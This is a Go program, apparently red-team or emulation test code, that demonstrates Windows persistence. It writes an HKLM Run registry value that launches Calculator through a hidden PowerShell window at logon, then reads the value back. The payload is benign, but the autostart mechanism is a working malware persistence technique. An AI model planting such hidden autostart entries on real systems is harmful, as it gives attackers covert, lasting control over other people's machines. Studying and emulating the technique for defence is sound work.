// This program demonstrates basic persistence through Windows registry manipulation.
// It creates a registry key, sets a value to execute "Calculator" using PowerShell,
// and then queries that registry key to confirm the value has been set.

package main

import (
	"golang.org/x/sys/windows/registry"
)

func CreateRegistryKey() error {
	path := `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

	k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, path, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer k.Close()
	return err
}

func SetRegistryValue(name string, value string) error {
	path := `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, path, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer k.Close()

	err = k.SetStringValue(name, value)
	if err != nil {
		return err
	}
	return err
}

func QueryRegistry(name string) (string, error) {
	path := `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, path, registry.QUERY_VALUE)
	if err != nil {
		return "", err
	}
	defer k.Close()

	s, _, err := k.GetStringValue(name)
	if err != nil {
		return "", err
	}
	return s, err
}

func main() {
	var err error
	var result string

	// Create a registry key in the persistence package
	err = CreateRegistryKey()
	if err != nil {
		println(err.Error())
	}

	// Set a registry value that launches Calculator in hidden mode using PowerShell
	err = SetRegistryValue("Calculator", `powershell.exe -WindowStyle hidden Start-Process calc.exe`)
	if err != nil {
		println(err.Error())
	}

	// Query the registry key to verify the "Calculator" value
	result, err = QueryRegistry("Calculator")
	if err != nil {
		println(err.Error())
	}
	println("[+] Register: ", result)
}
